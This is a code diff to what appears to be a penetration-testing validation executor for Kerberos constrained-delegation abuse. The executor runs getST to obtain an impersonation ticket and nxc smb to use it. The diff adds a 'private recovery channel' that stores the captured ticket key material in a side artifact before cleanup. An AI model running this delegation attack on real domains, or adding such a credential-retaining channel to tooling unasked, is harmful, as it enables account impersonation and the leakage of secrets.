@@ -33,7 +33,8 @@ from typing import Any, Optional
 
 from ..recommend import ParamSpec, ParamValue, values, recommended_spn
 from .. import proof
-from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
+from ._reveal_common import key_material
+from .base import (SecretReveal, ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                    redact_argv)
 
 
@@ -130,7 +131,18 @@ class ConstrainedDelegExecutor(ValidationExecutor):
         return target, extra
 
     # ---------------------------------------------------------------- execute
+    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
+        return list(artifact.get("_reveal", []))
+
     def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
+        # Private recovery channel, populated before downstream proof/cleanup.
+        artifact = {"_reveal": []}
+        ctx._pending_reveal_artifact = artifact
+
+        def finish_artifact(*args):
+            artifact.update(self._artifact(*args))
+            return artifact
+
         cfg = ctx.config
         v = values(params)
         deleg_principal = v["deleg_principal"]
@@ -159,12 +171,13 @@ class ConstrainedDelegExecutor(ValidationExecutor):
         res = ctx.runner.run(getst_argv, timeout=cfg.tool_timeout_s,
                              env={"KRB5CCNAME": None}, cwd=str(out_dir))
         ticket = self._parse_ticket(res.stdout or "", out_dir)
+        artifact["_reveal"].extend(key_material(self.technique, "ccache", impersonate, ticket))
         getst_ok = ticket is not None
         record("getST", getst_argv, res, getst_ok,
                 note="ticket saved" if getst_ok else "no ticket")
         if not getst_ok:
             errors.append("getST_no_ticket")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
 
         # 2) ticket-backed access = the terminal proof -----------------------
         nxc_argv = ["nxc", "smb", target_host, "-k", "--use-kcache",
@@ -195,7 +208,7 @@ class ConstrainedDelegExecutor(ValidationExecutor):
         )
         # complete = ticket obtained and the access step was executed.
         complete = getst_ok
-        return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)
+        return finish_artifact(steps, gate, mutation, terminal_fact, complete, errors)
 
     # ---------------------------------------------------------------- helpers
     @staticmethod
